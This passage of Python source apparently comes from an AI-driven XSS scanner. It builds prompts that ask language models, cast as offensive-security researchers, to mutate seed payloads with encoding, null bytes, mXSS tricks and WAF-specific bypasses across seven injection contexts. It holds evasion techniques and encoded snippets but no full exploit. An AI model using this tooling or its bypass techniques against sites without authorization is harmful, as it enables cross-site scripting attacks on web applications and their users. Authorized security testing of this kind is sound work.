            log.warning("OpenRouter fast batch failed: %s", exc)

    api_key = os.environ.get("OPENAI_API_KEY", "") or load_api_key("openai_api_key")
    if api_key:
        try:
            payloads = _call_api(OPENAI_BASE_URL, api_key, cloud_model, "openai")
            log.info("Fast batch: %d payloads from OpenAI", len(payloads))
            return payloads
        except Exception as exc:
            log.warning("OpenAI fast batch failed: %s", exc)

    log.error("Fast batch generation failed — no API key available or all backends failed")
    return []


def generate_normal_scout(
    context_type: str,
    waf: str | None,
    frameworks: list[str],
    seeds: list[str],
    *,
    model: str = "",
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    timeout: int = 30,
) -> list[str]:
    """Lightweight cloud scout for normal mode — seed mutation, not cold generation.

    Sends top seeds from Tier 1 to the cloud with instruction to mutate using
    creative encoding. Returns up to 3 payload strings. Returns [] on any error
    so the caller can fall through gracefully.

    The cloud prompt instructs seed mutation (encoding-heavy, assume angle brackets
    blocked) rather than cold generation. This is the Tier 3 normal mode call.
    """
    if not seeds:
        return []

    seed_list = "\n".join(f"- {s}" for s in seeds[:3])
    frameworks_str = ", ".join(frameworks[:3]) if frameworks else "unknown"
    waf_str = waf or "none detected"

    prompt = (
        f"Context: {context_type}\n"
        f"WAF: {waf_str}\n"
        f"Frameworks: {frameworks_str}\n"
        f"Seed payloads (had partial reflection, did not execute):\n{seed_list}\n\n"
        "These seed payloads had partial reflection but did not execute. "
        "Mutate them with creative encoding: multi-layer entity encoding, mixed encoding schemes, "
        "whitespace/null-byte injection, unicode normalization tricks, scheme fragmentation. "
        "Assume angle brackets are filtered. Generate 3 novel mutations. "
        'Return ONLY a valid JSON array of payload strings, e.g. ["payload1","payload2","payload3"]'
    )

    system_msg = (
        "You are an expert offensive-security researcher specialising in XSS. "
        "Return strict JSON only — no markdown, no commentary outside the JSON array."
    )

    resolved_model = model or OPENAI_FALLBACK_MODEL

    # CLI backend path
    if ai_backend == "cli":
        try:
            from ai_xss_generator.cli_runner import generate_via_cli_with_tool
            raw, _used_tool = generate_via_cli_with_tool(
                cli_tool,
                prompt,
                model=cli_model or None,
                timeout_seconds=timeout,
            )
            text = raw.strip()
            if text.startswith("```"):
                # strip opening fence + optional language tag
                text = text[3:]
                if "\n" in text:
                    text = text[text.index("\n") + 1:]
                # strip closing fence if present
                if text.strip().endswith("```"):
                    text = text[:text.rfind("```")]
                text = text.strip()
            parsed = json.loads(text)
            if isinstance(parsed, list):
                return [str(p).strip() for p in parsed if str(p).strip()][:3]
        except Exception as exc:
            log.debug("generate_normal_scout CLI error: %s", exc)
        return []

    # API backend path — try OpenRouter then OpenAI
    from ai_xss_generator.config import load_api_key

    def _call_scout_api(base_url: str, api_key: str, mdl: str) -> list[str]:
        headers: dict[str, str] = {
            "Authorization": f"Bearer {api_key}",
            "Content-Type": "application/json",
        }
        if "openrouter" in base_url:
            headers["HTTP-Referer"] = "https://github.com/axss"
            headers["X-Title"] = "axss"
        resp = requests.post(
            f"{base_url}/chat/completions",
            headers=headers,
            json={
                "model": mdl,
                "messages": [
                    {"role": "system", "content": system_msg},
                    {"role": "user", "content": prompt},
                ],
                "temperature": 0.7,
            },
            timeout=max(1, timeout),
        )
        resp.raise_for_status()
        content = resp.json()["choices"][0]["message"]["content"]
        text = content.strip()
        if text.startswith("```"):
            # strip opening fence + optional language tag
            text = text[3:]
            if "\n" in text:
                text = text[text.index("\n") + 1:]
            # strip closing fence if present
            if text.strip().endswith("```"):
                text = text[:text.rfind("```")]
            text = text.strip()
        parsed = json.loads(text)
        if isinstance(parsed, list):
            return [str(p).strip() for p in parsed if str(p).strip()][:3]
        return []

    api_key = os.environ.get("OPENROUTER_API_KEY", "") or load_api_key("openrouter_api_key")
    if api_key:
        try:
            return _call_scout_api(OPENROUTER_BASE_URL, api_key, resolved_model)
        except Exception as exc:
            log.debug("generate_normal_scout OpenRouter error: %s", exc)

    api_key = os.environ.get("OPENAI_API_KEY", "") or load_api_key("openai_api_key")
    if api_key:
        try:
            return _call_scout_api(OPENAI_BASE_URL, api_key, resolved_model)
        except Exception as exc:
            log.debug("generate_normal_scout OpenAI error: %s", exc)

    log.debug("generate_normal_scout: no API key available")
    return []


# ---------------------------------------------------------------------------
# Per-context prompt templates for seeded fast batch generation
# ---------------------------------------------------------------------------

_FAST_SEEDED_CONTEXT_DESCRIPTIONS: dict[str, str] = {
    "html_body": "Injected directly into HTML document body between tags",
    "html_attr_event": "Injected into an HTML attribute value where event handlers may be added",
    "html_attr_url": "Injected into href, src, action, or formaction — supports javascript: URIs",
    "js_string_dq": "Injected inside a JavaScript double-quoted string literal",
    "js_string_sq": "Injected inside a JavaScript single-quoted string literal",
    "js_template": "Injected inside a JavaScript template literal (backtick string)",
    "url_fragment": "Injected into URL hash/fragment processed by client-side JavaScript",
}

_FAST_SEEDED_CONTEXT_PROMPT = """\
Generate {count} XSS payloads for the "{context_type}" injection context.

Context description: {context_description}

Seed payloads (confirmed working — use as mutation starting points):
{seeds_text}

Mutation techniques to apply independently across your outputs:
- Keyword case variation: oNlOaD, ScRiPt, AlErT
- HTML entity encoding of event keywords: &#111;&#110;&#108;&#111;&#97;&#100;
- URL / double-URL encoding: %6f%6e, %256f%256e
- Whitespace substitution: %09 %0a %0d /**/ between attributes
- Alternative event handlers compatible with this context
- Alternative JS calls: alert() confirm() prompt() (confirm)``
- Comment injection between tag parts: <!-- --> /**/
- Null byte insertion: %00 between tag/event keywords{waf_instructions}

Return JSON: {{"payloads": [{{"payload": "...", "title": "...", "tags": ["context:{context_type}"], "bypass_family": "...", "risk_score": 1}}]}}
Generate exactly {count} payloads.\
"""

_FAST_SEEDED_WAF_INSTRUCTIONS = """
- Known {waf} bypass patterns: focus on techniques that evade {waf} specifically"""


def generate_fast_seeded_batch(
    cloud_model: str,
    waf_hint: str | None = None,
    count_per_context: int = 8,
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    request_timeout_seconds: int = 600,
) -> list[PayloadCandidate]:
    """Generate seeded context-specific payloads via 7 parallel API calls.

    Replaces generate_fast_batch() in the fast mode scan path. Instead of one
    cold 50-payload call, fires 7 concurrent context-specific calls each seeded
    with 2-3 golden library payloads + mutation technique instructions.

    Args:
        cloud_model:              Cloud model identifier.
        waf_hint:                 Known/detected WAF name — adds bypass instructions.
        count_per_context:        Payloads to request per context (default 8, × 7 = 56 total).
        ai_backend:               "api" (default) or "cli".
        cli_tool:                 CLI tool name (for cli backend only).
        cli_model:                CLI model (for cli backend only).
        request_timeout_seconds:  Per-call HTTP timeout (default 600s = 10 min).

    Returns:
        Merged deduplicated list[PayloadCandidate]. Returns [] on total failure.
    """
    import concurrent.futures

    from ai_xss_generator.payloads.golden_seeds import seeds_for_context
    from ai_xss_generator.config import load_api_key

    contexts = list(_FAST_SEEDED_CONTEXT_DESCRIPTIONS.keys())

    system_msg = (
        "You are an expert offensive-security researcher specialising in XSS. "
        "Return strict JSON only — no markdown, no commentary outside the JSON object."
    )

    waf_instr = (
        _FAST_SEEDED_WAF_INSTRUCTIONS.format(waf=waf_hint)
        if waf_hint else ""
    )

    def _build_prompt(context_type: str) -> str:
        seeds = seeds_for_context(context_type, n=3)
        seeds_text = "\n".join(f"  {s}" for s in seeds) if seeds else "  (none available)"
        return _FAST_SEEDED_CONTEXT_PROMPT.format(
            count=count_per_context,
            context_type=context_type,
            context_description=_FAST_SEEDED_CONTEXT_DESCRIPTIONS[context_type],
            seeds_text=seeds_text,
            waf_instructions=waf_instr,
        )

    def _candidate_payload_text(c: Any) -> str:
        return c.payload if hasattr(c, "payload") else str(c)

    def _call_one_context(context_type: str) -> list[PayloadCandidate]:
        prompt = _build_prompt(context_type)
        source = f"fast_seeded:{context_type}"

        if ai_backend == "cli":
            try:
                from ai_xss_generator.cli_runner import generate_via_cli_with_tool
                raw, _used = generate_via_cli_with_tool(
                    cli_tool, prompt, model=cli_model or None,
                    timeout_seconds=request_timeout_seconds,
                )
                data = _extract_json_blob(raw)
                return _normalize_payloads(data.get("payloads", []), source=source)
            except Exception as exc:
                log.debug("generate_fast_seeded_batch CLI error [%s]: %s", context_type, exc)
                return []

        def _api_call(base_url: str, api_key: str, model: str) -> list[PayloadCandidate]:
            headers: dict[str, str] = {
                "Authorization": f"Bearer {api_key}",
                "Content-Type": "application/json",
            }
            if "openrouter" in base_url:
                headers["HTTP-Referer"] = "https://github.com/axss"
                headers["X-Title"] = "axss"
            resp = requests.post(
                f"{base_url}/chat/completions",
                headers=headers,
                json={
                    "model": model,
                    "response_format": {"type": "json_object"},
                    "messages": [
                        {"role": "system", "content": system_msg},
                        {"role": "user",   "content": prompt},
                    ],
                    "temperature": 0.7,
                },
                timeout=max(1, request_timeout_seconds),
            )
            resp.raise_for_status()
            content = resp.json()["choices"][0]["message"]["content"]
            data = _extract_json_blob(content)
            return _normalize_payloads(data.get("payloads", []), source=source)

        resolved_model = cloud_model or OPENAI_FALLBACK_MODEL
        api_key = os.environ.get("OPENROUTER_API_KEY", "") or load_api_key("openrouter_api_key")
        if api_key:
            try:
                return _api_call(OPENROUTER_BASE_URL, api_key, resolved_model)
            except Exception as exc:
                log.debug("generate_fast_seeded_batch OpenRouter error [%s]: %s", context_type, exc)

        api_key = os.environ.get("OPENAI_API_KEY", "") or load_api_key("openai_api_key")
        if api_key:
            try:
                return _api_call(OPENAI_BASE_URL, api_key, resolved_model)
            except Exception as exc:
                log.debug("generate_fast_seeded_batch OpenAI error [%s]: %s", context_type, exc)

        return []

    log.info(
        "Fast seeded batch: firing %d parallel context-specific calls (model=%s)…",
        len(contexts), cloud_model,
    )

    results: list[PayloadCandidate] = []
    seen_payloads: set[str] = set()

    with concurrent.futures.ThreadPoolExecutor(max_workers=len(contexts)) as executor:
        futures = {executor.submit(_call_one_context, ctx): ctx for ctx in contexts}
        for future in concurrent.futures.as_completed(futures):
            ctx = futures[future]
            try:
                batch = future.result()
                for candidate in batch:
                    p_text = _candidate_payload_text(candidate)
                    if p_text and p_text not in seen_payloads:
                        seen_payloads.add(p_text)
                        results.append(candidate)
            except Exception as exc:
                log.debug("generate_fast_seeded_batch future error [%s]: %s", ctx, exc)

    log.info("Fast seeded batch complete: %d unique payloads", len(results))
    return results


def generate_deep_stored(
    cloud_model: str,
    param_name: str,
    context_type: str,
    follow_up_url: str,
    tried_payloads: list[str],
    *,
    count: int = 10,
    waf_hint: str | None = None,
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    request_timeout_seconds: int = 120,
) -> list[str]:
    """Generate targeted stored XSS payloads after universal payloads missed.

    Called when deep mode's stored universal payload sweep returns no confirms.
    Sends tried payloads as negative examples and requests mutations.

    Returns list of payload strings. Returns [] on error.
    """
    tried_str = "\n".join(f"  {p}" for p in tried_payloads[:5])
    waf_line = f"\nKnown WAF: {waf_hint}" if waf_hint else ""

    prompt = (
        f"Stored XSS injection point detected.\n"
        f"Parameter: {param_name}\n"
        f"Context: {context_type}\n"
        f"Follow-up render URL: {follow_up_url}{waf_line}\n\n"
        f"These universal payloads were tried and did NOT execute:\n{tried_str}\n\n"
        "The target stores the payload in a database and renders it on a separate page. "
        "Stored XSS is typically less filtered than reflected. "
        f"Generate {count} targeted payloads. Focus on: HTML sanitizer bypasses, "
        "mutation XSS (mXSS) tricks, filter evasion using entity encoding, "
        "alternative execution sinks (SVG, MathML, details/summary). "
        "Each payload must call alert(document.domain) or confirm(document.domain).\n"
        'Return ONLY a JSON array of payload strings: ["payload1","payload2",...]'
    )

    system_msg = (
        "You are an expert offensive-security researcher specialising in stored XSS. "
        "Return strict JSON only — no markdown, no commentary outside the JSON array."
    )

    resolved_model = cloud_model or OPENAI_FALLBACK_MODEL

    def _parse_response(content: str) -> list[str]:
        try:
            data = _extract_json_blob(content)
            if isinstance(data, list):
                return [str(p).strip() for p in data if str(p).strip()][:count]
            if isinstance(data, dict) and "payloads" in data:
                return [str(p).strip() for p in data["payloads"] if str(p).strip()][:count]
        except Exception:
            pass
        return []

    if ai_backend == "cli":
        try:
            from ai_xss_generator.cli_runner import generate_via_cli_with_tool
            raw, _used = generate_via_cli_with_tool(
                cli_tool, prompt, model=cli_model or None,
                timeout_seconds=request_timeout_seconds,
            )
            return _parse_response(raw.strip())
        except Exception as exc:
            log.debug("generate_deep_stored CLI error: %s", exc)
        return []

    from ai_xss_generator.config import load_api_key

    def _call_api(base_url: str, api_key: str, model: str) -> list[str]:
        headers: dict[str, str] = {
            "Authorization": f"Bearer {api_key}",
            "Content-Type": "application/json",
        }
        if "openrouter" in base_url:
            headers["HTTP-Referer"] = "https://github.com/axss"
            headers["X-Title"] = "axss"
        import requests as _req
        resp = _req.post(
            f"{base_url}/chat/completions",
            headers=headers,
            json={
                "model": model,
                "messages": [
                    {"role": "system", "content": system_msg},
                    {"role": "user",   "content": prompt},
                ],
                "temperature": 0.7,
            },
            timeout=max(1, request_timeout_seconds),
        )
        resp.raise_for_status()
        content = resp.json()["choices"][0]["message"]["content"]
        return _parse_response(content)

    api_key = os.environ.get("OPENROUTER_API_KEY", "") or load_api_key("openrouter_api_key")
    if api_key:
        try:
            return _call_api(OPENROUTER_BASE_URL, api_key, resolved_model)
        except Exception as exc:
            log.debug("generate_deep_stored OpenRouter error: %s", exc)

    api_key = os.environ.get("OPENAI_API_KEY", "") or load_api_key("openai_api_key")
    if api_key:
        try:
            return _call_api(OPENAI_BASE_URL, api_key, resolved_model)
        except Exception as exc:
            log.debug("generate_deep_stored OpenAI error: %s", exc)

    return []
